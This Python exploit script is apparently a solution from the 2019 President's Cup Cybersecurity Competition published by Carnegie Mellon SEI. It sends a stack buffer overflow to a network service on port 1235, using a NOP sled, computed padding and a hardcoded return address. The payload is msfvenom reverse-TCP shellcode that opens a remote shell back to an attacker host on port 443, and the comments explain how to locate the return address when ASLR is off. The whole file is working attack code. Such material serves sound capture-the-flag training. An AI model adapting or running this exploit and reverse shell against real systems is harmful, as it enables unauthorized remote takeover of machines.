#!/usr/bin/python

"""
President's Cup Cybersecurity Competition 2019 Challenges

Copyright 2020 Carnegie Mellon University.

NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING
INSTITUTE MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON
UNIVERSITY MAKES NO WARRANTIES OF ANY KIND, EITHER EXPRESSED OR
IMPLIED, AS TO ANY MATTER INCLUDING, BUT NOT LIMITED TO, WARRANTY OF
FITNESS FOR PURPOSE OR MERCHANTABILITY, EXCLUSIVITY, OR RESULTS
OBTAINED FROM USE OF THE MATERIAL. CARNEGIE MELLON UNIVERSITY DOES NOT
MAKE ANY WARRANTY OF ANY KIND WITH RESPECT TO FREEDOM FROM PATENT,
TRADEMARK, OR COPYRIGHT INFRINGEMENT.

Released under a MIT (SEI)-style license, please see license.txt or
contact permission@sei.cmu.edu for full terms.

[DISTRIBUTION STATEMENT A] This material has been approved for public
release and unlimited distribution.  Please see Copyright notice for
non-US Government use and distribution.

DM20-0347
"""

import socket
import struct

# Switch to False when ready to attempt exploit against the remote target.
LOCAL_TEST = False

if LOCAL_TEST:
    ip = '127.0.0.1'
else:
    ip = '172.16.212.199'

port = 1235
BUFFER_SIZE = 1024

payload =  b""

# Make some room on the stack so the payload doesn't clobber itself. 256 bytes is enough to get the stack away from our payload.
payload += '\x83\xc4\x80' # sub esp, 128
payload += '\x83\xc4\x80'

# Generate the payload using msfvenom:
if LOCAL_TEST:
    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b '\x00' -f python
    payload += b"\xb8\xb7\xf1\x72\x71\xdb\xca\xd9\x74\x24\xf4\x5e\x29"
    payload += b"\xc9\xb1\x12\x31\x46\x12\x83\xee\xfc\x03\xf1\xff\x90"
    payload += b"\x84\xcc\x24\xa3\x84\x7d\x98\x1f\x21\x83\x97\x41\x05"
    payload += b"\xe5\x6a\x01\xf5\xb0\xc4\x3d\x37\xc2\x6c\x3b\x3e\xaa"
    payload += b"\x11\xbb\xc0\x2b\x86\xb9\xc0\x2a\xed\x37\x21\x9c\x77"
    payload += b"\x18\xf3\x8f\xc4\x9b\x7a\xce\xe6\x1c\x2e\x78\x97\x33"
    payload += b"\xbc\x10\x0f\x63\x6d\x82\xa6\xf2\x92\x10\x6a\x8c\xb4"
    payload += b"\x24\x87\x43\xb6"
else:
    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.212.200 LPORT=443 -b '\x00' -f python
    payload += b"\xbd\x92\x30\xdc\x06\xdb\xd7\xd9\x74\x24\xf4\x58\x2b"
    payload += b"\xc9\xb1\x12\x31\x68\x12\x83\xc0\x04\x03\xfa\x3e\x3e"
    payload += b"\xf3\xcb\xe5\x49\x1f\x78\x59\xe5\x8a\x7c\xd4\xe8\xfb"
    payload += b"\xe6\x2b\x6a\x68\xbf\x03\x54\x42\xbf\x2d\xd2\xa5\xd7"
    payload += b"\x01\x34\x82\xef\x32\x37\x2a\xee\x79\xbe\xcb\x40\x1b"
    payload += b"\x91\x5a\xf3\x57\x12\xd4\x12\x5a\x95\xb4\xbc\x0b\xb9"
    payload += b"\x4b\x54\xbc\xea\x84\xc6\x55\x7c\x39\x54\xf5\xf7\x5f"
    payload += b"\xe8\xf2\xca\x20"

# Payload buffer in payloadable function is held in $edx just before strcpy call - we need to overwrite $ebp+4
# Gap is ($ebp+4 - $edx). We can see that just before the push, there is a lea instruction setting edx to $ebp-0x9e (or 158 decimal)
# So this gap will be 158 for this program.
padding = 158 - len(payload)

# NOP sled before the payload to add some tolerance for inaccuracy in the return address.
exploit =  b'MOD '
exploit += b'\x90' * padding
exploit += payload

# Address of the first byte after the 'MOD ' string in the exploit. This can always be found exactly on the local machine by checking the value of $edx just before
# the strcpy() call. On the remote machine, it will probably be at a different address but with the same offset. As seen below, my local stack was at 0xf7db424e,
# while the remote stack was at 0xf7dc224e. You will need to do a bit of trial and error searching back and forth by a page at a time (0x1000), but as long as ASLR
# is off on the target (which the setup script disables), the address should be consistent.
if LOCAL_TEST:
    ret_addr = 0xf7db424e
else:
    ret_addr = 0xf7dc224e
# Change return address to the approximate middle of the NOP sled on the stack.
ret_addr += int(padding / 2)
exploit += struct.pack('<L', ret_addr)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
print s.recv(BUFFER_SIZE)
s.sendall(exploit + '\r\n')
print s.recv(BUFFER_SIZE)
s.close()
